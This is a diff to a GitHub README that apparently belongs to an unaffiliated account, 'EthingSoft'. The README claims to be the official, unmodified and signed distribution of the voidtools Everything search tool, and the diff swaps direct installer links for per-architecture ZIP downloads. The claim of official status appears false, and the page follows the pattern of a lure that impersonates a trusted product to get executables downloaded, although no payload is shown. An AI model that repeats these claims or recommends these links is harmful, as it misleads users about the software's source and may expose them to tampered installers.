@@ -10,11 +10,9 @@ Download the official, unchanged **Everything** installers for Windows. Everythi
 | --- | --- | --- |
 | Windows | Original installers | 1.4.1.1032 stable |
 
-[**Download official x64 installer**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032.x64-Setup.exe)
+[**Download x64 installer ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip)
 &nbsp; · &nbsp;
-[**Download official x86 installer**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032.x86-Setup.exe)
-&nbsp; · &nbsp;
-[**Download ZIP with both installers**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-Windows-Installers.zip)
+[**Download x86 installer ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip)
 &nbsp; · &nbsp;
 [Release notes](https://github.com/EthingSoft/everything-download/releases)
 
@@ -39,7 +37,7 @@ Everything is a Windows desktop search utility focused on file and folder names.
 
 ## Package and license
 
-This official distribution contains the original, unmodified Everything installers. The stable release is version **1.4.1.1032**; beta builds and portable application packages are not included. The Windows Installers ZIP bundles both setup files (x64 and x86).
+This official distribution contains the original, unmodified Everything installers. The stable release is version **1.4.1.1032**; beta builds and portable application packages are not included. Each architecture is provided in its own ZIP containing only its matching installer.
 
 Everything is copyright © 2018 David Carpenter and is distributed under the license included in [`LICENSE.txt`](LICENSE.txt). That license permits copying and distribution subject to the included copyright and permission notice. The license file also contains the applicable notice for PCRE.
 
@@ -47,11 +45,10 @@ The installers retain their valid `voidtools PTY LTD` Authenticode signature. Ev
 
 ## Releases
 
-| Architecture | Installer |
+| Architecture | Installer ZIP |
 | --- | --- |
-| x64 | [Everything-1.4.1.1032.x64-Setup.exe](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032.x64-Setup.exe) |
-| x86 | [Everything-1.4.1.1032.x86-Setup.exe](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032.x86-Setup.exe) |
-| Both installers | [Everything-1.4.1.1032-Windows-Installers.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-Windows-Installers.zip) |
+| x64 | [Everything-1.4.1.1032-x64-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip) |
+| x86 | [Everything-1.4.1.1032-x86-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip) |
 
 ## Project links
 
